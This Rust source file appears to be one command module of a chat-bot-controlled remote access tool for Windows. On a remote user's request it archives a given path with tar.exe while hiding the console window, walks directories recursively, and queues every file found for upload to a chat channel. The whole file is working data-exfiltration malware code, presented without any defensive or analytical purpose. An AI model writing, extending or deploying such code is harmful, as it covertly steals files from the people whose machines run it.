use std::{path::Path, fs, process::Command, os::windows::process::CommandExt};
use rand::distributions::{Alphanumeric, DistString};
use serde_json::json;
use crate::BOT_TO_SEND;
pub async fn main(channel_id: u64, user: String, input: String, do_tar: bool) {
    let mut not_found= true;
    let mut path= Path::new(input.trim());
    let zippath= std::env::temp_dir().to_string_lossy().to_string() + input.trim() + "-" + &Alphanumeric.sample_string(&mut rand::thread_rng(), 12) + ".tar";
    let mut del_file= false;
    if do_tar {
        Command::new("tar.exe").creation_flags(0x08000000)
            .args(["-c", "-f", &zippath, &path.to_string_lossy()])
            .spawn().unwrap().wait().unwrap();
        path= Path::new(&zippath);
        del_file= true;
    }
    if path.exists() {
        if path.is_file() {
            not_found= false;
            BOT_TO_SEND.lock().await.push(json!({
                "channel": channel_id,
                "content": &format!("```File requested by {}```", user),
                "files": [path.to_string_lossy()],
                "react": ["🔴"],
                "delete_files": del_file
            }));
        }
        if path.is_dir() {
            not_found= false;
            let mut files= Vec::new();
            let mut to_discover= Vec::new();
            to_discover.push(input.trim().to_string());
            while !to_discover.is_empty() {
                for file in fs::read_dir(to_discover.remove(0)).unwrap().flatten() {
                    let meta= file.metadata().unwrap();
                    let f= file.path().to_string_lossy().trim().to_string();
                    if meta.is_file() {
                        files.push(f);
                    }else if meta.is_dir() {
                        to_discover.push(f);
                    }
                }
            }
            if !files.is_empty() {
                BOT_TO_SEND.lock().await.push(json!({
                    "channel": channel_id,
                    "content": &format!("```Files requested by {}```", user),
                    "files": files,
                    "react": ["🔴"]
                }));
            }
        }
    }else{
        BOT_TO_SEND.lock().await.push(json!({
            "channel": channel_id,
            "content": &"```❗ An unknown error occurred while unifying the directory!```".to_string(),
            "react": ["🔴"]
        })); 
    }
    if not_found {
        BOT_TO_SEND.lock().await.push(json!({
            "channel": channel_id,
            "content": &"```❗ Directory not found!```".to_string(),
            "react": ["🔴"]
        }));
    }
}